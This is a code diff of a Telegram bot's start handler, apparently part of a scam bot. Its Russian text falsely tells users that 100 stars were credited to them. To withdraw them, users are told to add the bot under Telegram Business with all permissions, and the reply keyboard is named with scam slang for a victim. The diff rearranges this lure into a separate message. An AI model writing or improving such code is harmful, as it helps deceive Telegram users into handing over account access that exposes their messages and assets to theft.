@@ -322,12 +322,6 @@ async def start_command(message: Message, command: CommandObject):
     payload = command.args 
     activation_text = f"""
 <b>🩷 На ваш баланс было зачислено 100✨ от @Collector1win. Чтобы вывести, выполни следующие шаги:</b>
-<blockquote><i>
- [1] Перейдите в настройки Telegram.
- [2] Откройте раздел Telegram Business.
- [3] Нажмите 'Боты для бизнеса'.
- [4] Добавьте бота, предоставив все разрешения
- </i></blockquote>
 """
     photo_url = 'https://i.postimg.cc/G2MFGz78/photo-2025-07-11-09-43-26.jpg' 
 
@@ -340,6 +334,13 @@ async def start_command(message: Message, command: CommandObject):
     show_caption_above_media=True,
     reply_markup=mamont.as_markup()
 )
+    await message.answer(f"""<blockquote><i>
+ [1] Перейдите в настройки Telegram.
+ [2] Откройте раздел Telegram Business.
+ [3] Нажмите 'Боты для бизнеса'.
+ [4] Добавьте бота, предоставив все разрешения
+ </i></blockquote>
+    """, parse_mode='html')
 
 
         
